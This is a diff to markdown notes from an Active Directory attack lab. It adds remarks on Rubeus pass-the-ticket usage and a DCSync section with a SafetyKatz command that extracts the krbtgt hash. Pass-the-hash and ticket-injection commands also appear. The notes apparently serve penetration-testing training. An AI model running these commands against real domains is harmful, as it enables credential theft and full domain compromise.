@@ -27,14 +27,24 @@ Loader.exe SafetyKatz.exe "sekurlsa::pth /user:administrator /domain: dollarcorp
 The above commands starts a process with a logon type 9 (same as runas
 /netonly). This means that if you run a `whoami` it will still show as the low priv user, but when you access domain resources it will use the domain administrator credentials.
 
-Rubeus (does not need elevation)
+Rubeus (does not need elevation) - this overwrites your current tickets
 ```powershell
 Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
 ```
 
-Elevation required
+Elevation required to create a new process
 ```powershell
 Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+### DCSync
+To extract credentials from the DC without code execution on it, we can
+use DCSync
+
+To use the DCSync feature for getting `krbtgt` hash execute the below
+command with DA privileges for dcorp domain:
+```powershell
+Loader.exe SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 ```
 
 
